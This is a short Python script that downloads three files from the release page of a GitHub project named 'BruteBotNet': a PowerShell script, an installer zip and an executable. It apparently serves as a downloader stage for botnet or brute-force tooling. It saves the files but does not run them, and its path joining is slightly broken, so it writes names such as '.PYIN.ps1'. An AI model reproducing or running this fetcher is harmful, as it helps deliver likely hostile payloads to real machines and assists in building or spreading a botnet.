import requests

urls = [
    'https://github.com/AzizDXT/BruteBotNet/releases/download/V6.0/PYIN.ps1',
    'https://github.com/AzizDXT/BruteBotNet/releases/download/V6.0/InstallerBN.zip',
    'https://github.com/AzizDXT/BruteBotNet/releases/download/V6.0/Advanced.Installer.Architect.v13.2.exe'
]

destination_folder = '.'

for url in urls:
    response = requests.get(url)
    if response.status_code == 200:
        file_name = url.split('/')[-1]
        file_path = destination_folder + file_name
        with open(file_path, 'wb') as file:
            file.write(response.content)
        print(f'Downloaded > {file_name}')
    else:
        print(f'No Downloaded {url}')
